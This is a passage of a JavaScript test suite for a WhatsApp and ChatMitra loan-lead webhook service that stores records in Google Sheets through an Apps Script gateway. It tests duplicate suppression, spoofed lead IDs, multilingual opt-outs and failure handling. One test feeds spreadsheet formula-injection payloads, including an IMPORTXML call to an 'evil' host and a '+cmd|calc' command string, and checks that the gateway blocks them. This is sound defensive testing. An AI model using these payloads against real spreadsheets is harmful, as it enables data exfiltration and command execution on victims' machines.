    assert.ok(await messageEventRepository.findByProviderMessageId('cm_sig_plain', 'ChatMitra'));
    assert.ok(await messageEventRepository.findByProviderMessageId('cm_out_live_1', 'ChatMitra'));

    // Duplicate provider message ID swallowed with zero duplicate outbound send
    const rDup = await chatmitraWebhookRoute.POST(
      makeChatMitraRequest(cmInbound('cm_sig_plain', 'Need a Home Loan'), { headerName: 'x-webhook-signature', prefix: '' })
    );
    assert.equal(rDup.status, 200);
    assert.equal((await rDup.json()).duplicate, true);
    await Promise.all(waitUntilPromises);
    assert.equal(cmOutboundCalls, 1, 'Duplicate ChatMitra webhook MUST NOT trigger duplicate outbound send');

    // x-hub-signature-256 with sha256= prefix + spoofed victim leadId rejected
    await seedCustomer({ customer_id: 'CUST-CM-VICTIM', mobile_number: '+919822999111' });
    await leadRepository.upsertLead({ lead_id: 'AVL-CM-VICTIM', customer_id: 'CUST-CM-VICTIM', loan_category: 'Doctor Loan' });
    const rHub = await chatmitraWebhookRoute.POST(
      makeChatMitraRequest(
        cmInbound('cm_sig_hub', 'Need Business Loan', { customerId: 'CUST-CM-VICTIM', leadId: 'AVL-CM-VICTIM' }),
        { headerName: 'x-hub-signature-256', prefix: 'sha256=' }
      )
    );
    assert.equal(rHub.status, 200);
    await Promise.all(waitUntilPromises);
    assert.equal((await leadRepository.findById('AVL-CM-VICTIM')).customer_id, 'CUST-CM-VICTIM');

    // x-signature header + ChatMitra outbound timeout marks WEBHOOK_EVENTS FAILED
    axios.post = async () => { throw Object.assign(new Error('timeout of 10000ms exceeded'), { code: 'ECONNABORTED' }); };
    const rTimeout = await chatmitraWebhookRoute.POST(
      makeChatMitraRequest(cmInbound('cm_out_timeout', 'Personal Loan'), { headerName: 'x-signature', prefix: '' })
    );
    assert.equal(rTimeout.status, 200);
    await Promise.all(waitUntilPromises);
    assert.equal((await webhookEventRepository.findById('CM_INBOUND_cm_out_timeout')).processing_status, 'FAILED');

    // Worker auth failure marks WEBHOOK_EVENTS FAILED
    process.env.INTERNAL_WORKER_SECRET = '';
    const rNoAuth = await chatmitraWebhookRoute.POST(makeChatMitraRequest(cmInbound('cm_no_wauth', 'Personal Loan')));
    assert.equal(rNoAuth.status, 200);
    await Promise.all(waitUntilPromises);
    assert.equal((await webhookEventRepository.findById('CM_INBOUND_cm_no_wauth')).error_code, 'WORKER_AUTH_UNCONFIGURED');
    process.env.INTERNAL_WORKER_SECRET = TEST_WORKER_SECRET;

    // English STOP, Hindi रोकें, Marathi थांबवा opt-outs via ChatMitra
    for (const [label, phrase] of [['en', 'STOP'], ['hi', 'रोकें'], ['mr', 'थांबवा']]) {
      resetMockSheetsStore();
      waitUntilPromises = [];
      axios.post = async () => ({ status: 200, data: { id: `cm_opt_ack_${label}` } });
      const rOpt = await chatmitraWebhookRoute.POST(makeChatMitraRequest(cmInbound(`cm_opt_${label}`, phrase)));
      assert.equal(rOpt.status, 200);
      await Promise.all(waitUntilPromises);
      const cust = await customerRepository.findByMobile(AUTH_PHONE_E164);
      assert.equal(cust.record_status, 'OPTED_OUT', `ChatMitra ${label} opt-out must persist OPTED_OUT`);
    }
  });
});

// ============================================================================
// GROUP G — REAL `gateway.gs` VM FULL-PATH CONTRACT & LAYER D FAILURE INJECTION
// ============================================================================
describe('Group G — Google Sheets gateway.gs VM Full-Path & Layer D Failure Injection', () => {
  const origFetch = globalThis.fetch;
  const origAxiosPost = axios.post;
  let envSnap;
  let vmHarness;

  beforeEach(() => {
    envSnap = snapshotEnv();
    setupDefaultTestEnv();
    vmHarness = createGatewayVmHarness();
    process.env.GOOGLE_SHEETS_TRANSPORT_MODE = 'APPS_SCRIPT_GATEWAY';
    delete process.env.GOOGLE_SHEETS_ENABLE_MOCK;
    process.env.GOOGLE_SHEETS_GATEWAY_URL = 'https://script.google.com/macros/s/task5h33-vm/exec';
    process.env.GOOGLE_SHEETS_GATEWAY_SECRET = TEST_GATEWAY_SECRET;
    globalThis.fetch = vmHarness.gatewayFetch;
  });

  afterEach(() => {
    globalThis.fetch = origFetch;
    axios.post = origAxiosPost;
    restoreEnv(envSnap);
  });

  it('G01: Full path Webhook -> Worker -> Provider Adapter -> Repo -> GoogleSheetsClient -> real gateway.gs VM with exact 9 tabs & zero DB fallback', async () => {
    // Route worker HTTP fetch directly into workerRoute, and gateway HTTP fetch into vmHarness
    globalThis.fetch = async (url, init) => {
      if (String(url).includes('/api/whatsapp-webhook-worker')) {
        const wResp = await workerRoute.POST(
          new Request(url, { method: init.method, headers: init.headers, body: init.body })
        );
        return { ok: wResp.status >= 200 && wResp.status < 300, status: wResp.status, json: () => wResp.json() };
      }
      return vmHarness.gatewayFetch(url, init);
    };

    axios.post = async () => ({ status: 200, data: { messages: [{ id: 'wamid.vm_full_out_01' }] } });
    const body = {
      object: 'whatsapp_business_account',
      entry: [{
        changes: [{
          value: {
            contacts: [{ profile: { name: 'VM Full Path User' } }],
            messages: [{ from: AUTH_PHONE_DIGITS, id: 'wamid.vm_full_in_01', type: 'text', text: { body: 'I want a CA Professional Loan' } }]
          }
        }]
      }]
    };

    const resp = await metaWebhookRoute.POST(makeMetaRequest(body));
    assert.equal(resp.status, 200);
    const data = await resp.json();
    assert.equal(data.success, true);
    assert.equal(data.persisted, true);
    assert.equal(data.persistenceState, 'PERSISTED');

    assert.equal(vmHarness.sheetsMap.size, 9, 'Canonical 9-tab schema preserved');
    assert.equal(vmHarness.sheetsMap.get('CUSTOMERS').length, 2);
    assert.equal(vmHarness.sheetsMap.get('LEADS').length, 2);
    assert.equal(vmHarness.sheetsMap.get('CONSENTS').length, 2);
    assert.equal(vmHarness.sheetsMap.get('MESSAGE_EVENTS').length, 3, 'Header + inbound + outbound rows');
    assert.equal(vmHarness.sheetsMap.get('WEBHOOK_EVENTS').length, 2);
    assert.equal(mongoAttemptCount, 0);
    assert.equal(postgresAttemptCount, 0);
    assert.ok(vmHarness.getVmCallCount() >= 5);
  });

  it('G02: Real gateway.gs VM enforces formula injection, replay nonce, clock skew, spreadsheet allowlist, payload >64KB, and schema mismatch', async () => {
    const callVmRaw = async (bodyString) => {
      const r = await vmHarness.gatewayFetch(process.env.GOOGLE_SHEETS_GATEWAY_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: bodyString
      });
      return r.json();
    };

    // 1. Formula injection directly through VM
    for (const badVal of ['=IMPORTXML("http://evil","//a")', '+cmd|calc', '-2+3', '@SUM(A1:A2)']) {
      const signed = signAppsScriptGatewayRequest(
        {
          action: 'UPSERT_ROW',
          tab: 'MESSAGE_EVENTS',
          rowValues: ['MSG_META_f1', 'CUST-1', 'Meta', 'TEXT', 'outbound', 'SENT', badVal, new Date().toISOString()]
        },
        TEST_GATEWAY_SECRET
      );
      const res = await callVmRaw(signed.bodyString);
      assert.equal(res.ok, false);
      assert.equal(res.code, 'GOOGLE_SHEETS_FORMULA_INJECTION_BLOCKED');
    }

    // 2. Nonce replay rejected 401
    const signedOnce = signAppsScriptGatewayRequest({ action: 'HEALTH_CHECK' }, TEST_GATEWAY_SECRET);
    assert.equal((await callVmRaw(signedOnce.bodyString)).ok, true);
    const replayed = await callVmRaw(signedOnce.bodyString);
    assert.equal(replayed.ok, false);
    assert.equal(replayed.status, 401);

    // 3. Clock skew (>300s) rejected 401
    const skewed = signAppsScriptGatewayRequest({ action: 'HEALTH_CHECK' }, TEST_GATEWAY_SECRET, {
      timestampMs: Date.now() - 400_000
    });
    assert.equal((await callVmRaw(skewed.bodyString)).status, 401);

    // 4. Caller-supplied spreadsheetId rejected 400
    const withSheetId = signAppsScriptGatewayRequest({ action: 'HEALTH_CHECK', spreadsheetId: TEST_SPREADSHEET_ID }, TEST_GATEWAY_SECRET);
    assert.equal((await callVmRaw(withSheetId.bodyString)).status, 400);

    // 5. Payload >64KB rejected 400
    const oversized = await callVmRaw('X'.repeat(70_000));
    assert.equal(oversized.ok, false);
    assert.equal(oversized.status, 400);

    // 6. Spreadsheet allowlist mismatch rejected 403
    const mismatchVm = createGatewayVmHarness({ activeSpreadsheetId: '1WRONG_SPREADSHEET_999' });
    const signedOk = signAppsScriptGatewayRequest({ action: 'HEALTH_CHECK' }, TEST_GATEWAY_SECRET);
    const misRes = await (await mismatchVm.gatewayFetch(process.env.GOOGLE_SHEETS_GATEWAY_URL, { method: 'POST', body: signedOk.bodyString })).json();
    assert.equal(misRes.ok, false);
    assert.equal(misRes.status, 403);

    // 7. Schema mismatch rejected 500
    vmHarness.sheetsMap.get('MESSAGE_EVENTS')[0][0] = 'corrupted_col';
    const schemaReq = signAppsScriptGatewayRequest({ action: 'GET_ALL', tab: 'MESSAGE_EVENTS' }, TEST_GATEWAY_SECRET);
    const schemaRes = await callVmRaw(schemaReq.bodyString);
    assert.equal(schemaRes.ok, false);
    assert.equal(schemaRes.code, 'GOOGLE_SHEETS_SCHEMA_INVALID');
  });

  it('G03: Layer D failure injection (401, 403, 429, 500, timeout, malformed envelope, partial multi-tab write + safe retry)', async () => {
    const faultCases = [
      { status: 401, expectedCode: 'GOOGLE_SHEETS_AUTH_FAILED' },
      { status: 403, expectedCode: 'GOOGLE_SHEETS_AUTH_FAILED' },
      { status: 429, expectedCode: 'GOOGLE_SHEETS_QUOTA_EXCEEDED' },
      { status: 500, expectedCode: 'GOOGLE_SHEETS_UNAVAILABLE' }
    ];
    for (const fc of faultCases) {
      globalThis.fetch = async () => ({
        ok: true,
        status: 200,
        json: async () => ({ ok: false, status: fc.status, code: fc.expectedCode, error: `Injected ${fc.status}` })
      });
      await assert.rejects(
        () => messageEventRepository.findAll(),
        (err) => err instanceof SheetsCrmError && err.code === fc.expectedCode
      );
    }

    // Malformed gateway envelope (missing data.created boolean) fails closed
    globalThis.fetch = async () => ({
      ok: true,
      status: 200,
      json: async () => ({ ok: true, data: {} })
    });
    await assert.rejects(
      () =>
        messageEventRepository.recordMessageEvent({
          customer_id: 'CUST-9175635165',
          provider: 'Meta',
          message_type: 'TEXT',
          direction: 'outbound',
          delivery_status: 'SENT',
          provider_message_id: 'wamid.malformed_gw'
        }),
      (err) => err instanceof SheetsCrmError
    );

    // Gateway timeout fails closed with SheetsCrmError
    globalThis.fetch = async () => {
      throw Object.assign(new Error('Gateway request aborted due to timeout'), { name: 'AbortError' });
    };
    await assert.rejects(
      () => messageEventRepository.findAll(),
      (err) => err instanceof SheetsCrmError && err.code === 'GOOGLE_SHEETS_UNAVAILABLE'
    );

    // Partial multi-tab write: CUSTOMERS/LEADS succeed, MESSAGE_EVENTS write fails across retries -> worker returns 503 FAILED; subsequent retry completes cleanly with zero duplicate customers/messages
    let blockMessageEventWrites = true;
    globalThis.fetch = async (url, init) => {
      const cmd = JSON.parse(JSON.parse(init.body).payloadJson);
      if (cmd.action === 'UPSERT_ROW' && cmd.tab === 'MESSAGE_EVENTS' && blockMessageEventWrites) {
        return {
          ok: true,
          status: 200,
          json: async () => ({ ok: false, status: 500, code: 'GOOGLE_SHEETS_UNAVAILABLE', error: 'Partial write drop' })
        };
      }
      return vmHarness.gatewayFetch(url, init);
    };

    process.env.WHATSAPP_INBOUND_AI_REPLY_ENABLED = 'false';
    const workerPayload = {
      eventId: 'META_INBOUND_PARTIAL_01',
      eventType: 'INBOUND_MESSAGE',
      provider: 'Meta',
      correlationId: 'CORR-PARTIAL-1',
      data: {
        fromPhone: AUTH_PHONE_E164,
        msgId: 'wamid.partial_01',
        profileName: 'Partial User',
        message: { type: 'text', text: { body: 'Need a Home Loan' }, id: 'wamid.partial_01' }
      }
    };

    const failResp = await workerRoute.POST(makeWorkerRequest(workerPayload));
    assert.equal(failResp.status, 503);
    assert.equal(vmHarness.sheetsMap.get('CUSTOMERS').length, 2, 'Customer created before partial failure');
    assert.equal(vmHarness.sheetsMap.get('MESSAGE_EVENTS').length, 1, 'MESSAGE_EVENTS write failed');

    // Recover gateway and retry same FAILED event -> completes cleanly with ZERO duplicate customer/lead/message rows
    blockMessageEventWrites = false;
    const retryResp = await workerRoute.POST(makeWorkerRequest(workerPayload));
    assert.equal(retryResp.status, 200);
    assert.equal((await retryResp.json()).persisted, true);
    assert.equal(vmHarness.sheetsMap.get('CUSTOMERS').length, 2, 'Zero duplicate customers on retry');
    assert.equal(vmHarness.sheetsMap.get('LEADS').length, 2, 'Zero duplicate leads on retry');
    assert.equal(vmHarness.sheetsMap.get('MESSAGE_EVENTS').length, 2, 'Exactly 1 MESSAGE_EVENTS row after recovery');
  });
});
